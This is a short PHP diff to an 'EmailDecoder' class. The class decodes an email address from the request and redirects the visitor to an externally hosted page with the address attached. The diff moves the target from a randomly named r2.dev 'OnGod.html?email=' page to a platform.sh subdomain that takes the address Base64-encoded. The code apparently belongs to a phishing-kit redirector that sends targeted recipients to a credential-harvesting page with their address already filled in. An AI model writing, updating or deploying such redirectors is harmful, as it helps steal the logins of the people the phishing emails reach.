@@ -13,11 +13,19 @@ class EmailDecoder
     // Decode the email and redirect
     public static function decode($email)
     {
+        // Check if email is Base64 encoded and decode it
         if (self::isBase64($email)) {
             $email = base64_decode($email);
         }
 
-        header("Location: https://pub-52b565e2d63449c59c1957eb7cd05dc4.r2.dev/OnGod.html?email=" . $email);
+        // Re-encode the email in Base64 to include in the URL
+        $encodedEmail = base64_encode($email);
+
+        // Construct the URL for Platform.sh
+        $url = "https://main-bvxea6i-vniscdoaqtby6.fr-4.platformsh.site/{$encodedEmail}";
+
+        // Redirect to the constructed URL
+        header("Location: $url");
         exit;
     }
 }
